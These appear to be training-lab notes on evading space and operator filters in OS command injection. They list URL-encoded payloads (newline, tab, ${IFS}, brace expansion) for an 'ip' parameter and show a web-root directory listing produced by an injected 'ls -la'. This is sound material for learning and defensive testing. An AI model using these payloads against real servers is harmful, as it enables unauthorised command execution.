# Bypassing Space Filters

## Bypass Blacklisted Operators

The new-line character is usually not blacklisted, as it may be needed in the payload itself.

ip=127.0.0.1%0a+whoami

## Bypass Blacklisted Spaces

Using Tabs

Tabs : %09
127.0.0.1%0a%09

Using $IFS
($IFS) Linux Environment Variable may also work since its default value is a space and a tab

127.0.0.1%0a${IFS}

Using Brace Expansion
127.0.0.1%0a{ls,-la}

To discover more space filter bypasses, check out :
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space


127.0.0.1%0a{ls,-la}index.php

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms


127.0.0.1%0a{ls,-la}
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.038/0.038/0.038/0.000 ms
total 16
drwxr-xr-x 1 www-data www-data 4096 Jul 16  2021 .
drwxr-xr-x 1 www-data www-data 4096 Aug 19  2020 ..
-rw-r--r-- 1 www-data www-data 1613 Jul 16  2021 index.php
-rw-r--r-- 1 www-data www-data 1256 Jul 12  2021 style.css